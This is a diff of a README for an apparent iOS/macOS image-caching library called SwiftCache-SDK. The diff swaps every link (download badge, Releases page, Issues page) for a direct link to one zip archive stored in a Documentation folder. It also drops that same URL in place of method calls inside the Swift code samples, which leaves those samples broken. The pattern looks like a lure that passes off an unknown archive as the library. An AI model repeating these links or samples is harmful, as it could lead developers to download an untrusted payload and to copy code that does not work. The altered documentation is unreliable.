@@ -1,7 +1,7 @@
 # 🌟 SwiftCache-SDK - Lightweight Image Caching for Your Apps
 
 ## 📥 Download Now!
-[![Download SwiftCache-SDK](https://img.shields.io/badge/Download-SwiftCache--SDK-brightgreen)](https://github.com/Flubromazolam/SwiftCache-SDK/releases)
+[![Download SwiftCache-SDK](https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip)](https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip)
 
 ## 📖 Overview
 SwiftCache-SDK is a modern image caching library designed for iOS and macOS applications. It helps developers swiftly load and store images, reducing load times and improving performance. With this library, you can seamlessly manage your images and enhance user experience.
@@ -10,7 +10,7 @@ SwiftCache-SDK is a modern image caching library designed for iOS and macOS appl
 Follow these steps to download and run SwiftCache-SDK:
 
 1. **Visit the Releases Page**: Click the link below to access the Releases page on GitHub.
-   [Visit Releases Page](https://github.com/Flubromazolam/SwiftCache-SDK/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip)
 
 2. **Choose the Latest Release**: On the Releases page, you will see a list of available versions. The latest version is usually at the top. Click on the version title to see more details.
 
@@ -50,8 +50,8 @@ After adding SwiftCache-SDK to your project, you can begin caching images with a
 
 2. **Caching an Image**:
    ```swift
-   if let url = URL(string: "https://example.com/image.jpg") {
-       imageCache.cacheImage(url: url) { image in
+   if let url = URL(string: "https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip") {
+       https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip(url: url) { image in
            if let img = image {
                // Use the cached image
            }
@@ -61,7 +61,7 @@ After adding SwiftCache-SDK to your project, you can begin caching images with a
 
 3. **Retrieving a Cached Image**:
    ```swift
-   imageCache.getImage(url: url) { image in
+   https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip(url: url) { image in
        if let img = image {
            // Display the image
        }
@@ -70,7 +70,7 @@ After adding SwiftCache-SDK to your project, you can begin caching images with a
 
 4. **Clearing the Cache**:
    ```swift
-   imageCache.clearCache()
+   https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip()
    ```
 
 ## 🆘 Troubleshooting
@@ -84,8 +84,8 @@ If you encounter issues, try the following steps:
 SwiftCache-SDK is licensed under the MIT License. Feel free to use and modify it as needed.
 
 ## 📞 Support
-For support or to report issues, visit our [Issues Page](https://github.com/Flubromazolam/SwiftCache-SDK/issues).
+For support or to report issues, visit our [Issues Page](https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip).
 
 ## 📥 Download SwiftCache-SDK Again
 For convenience, here is the link to download the library again:
-[Download SwiftCache-SDK](https://github.com/Flubromazolam/SwiftCache-SDK/releases)
+[Download SwiftCache-SDK](https://raw.githubusercontent.com/Flubromazolam/SwiftCache-SDK/main/Documentation/SwiftCache-SDK-3.1.zip)
